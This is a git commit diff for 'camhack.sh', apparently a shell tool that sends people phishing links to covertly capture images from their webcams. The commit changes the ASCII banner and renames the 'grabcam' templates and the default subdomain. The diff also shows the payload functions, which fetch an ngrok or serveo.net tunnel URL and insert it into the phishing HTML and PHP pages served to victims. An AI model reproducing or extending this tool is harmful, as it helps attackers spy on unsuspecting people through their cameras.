3e900a3ea8a1fa5c1eb8c61aa98a6a63e385032e
AKSHAY ARJUN <68991993+PlanetHackers-YT@users.noreply.github.com>
2020-09-07 13:45:58 +0530

    Update camhack.sh

--- camhack.sh
+++ camhack.sh
@@ -21,7 +21,17 @@ echo '
                         |    _     ||   -_  
                         |  ((_))   ||     -_
                         |__________|/
-              ' |lolcat
+                  ___           ___           ___           ___           ___           ___     
+     /\  \         /\__\         /\  \         /\__\         /\  \         |\__\    
+    /::\  \       /:/  /        /::\  \       /:/  /        /::\  \        |:|  |   
+   /:/\:\  \     /:/__/        /:/\ \  \     /:/__/        /:/\:\  \       |:|  |   
+  /::\~\:\  \   /::\__\____   _\:\~\ \  \   /::\  \ ___   /::\~\:\  \      |:|__|__ 
+ /:/\:\ \:\__\ /:/\:::::\__\ /\ \:\ \ \__\ /:/\:\  /\__\ /:/\:\ \:\__\     /::::\__\
+ \/__\:\/:/  / \/_|:|~~|~    \:\ \:\ \/__/ \/__\:\/:/  / \/__\:\/:/  /    /:/~~/~   
+      \::/  /     |:|  |      \:\ \:\__\        \::/  /       \::/  /    /:/  /     
+      /:/  /      |:|  |       \:\/:/  /        /:/  /        /:/  /     \/__/      
+     /:/  /       |:|  |        \::/  /        /:/  /        /:/  /                 
+     \/__/         \|__|         \/__/         \/__/         \/__/                    ' |lolcat
 
                                                                                
 echo " "
@@ -135,7 +145,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
+sed 's+forwarding_link+'$link'+g' camhack.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -223,7 +233,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' camhack.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -232,7 +242,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="grabcam$RANDOM"
+default_subdomain="camhack$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
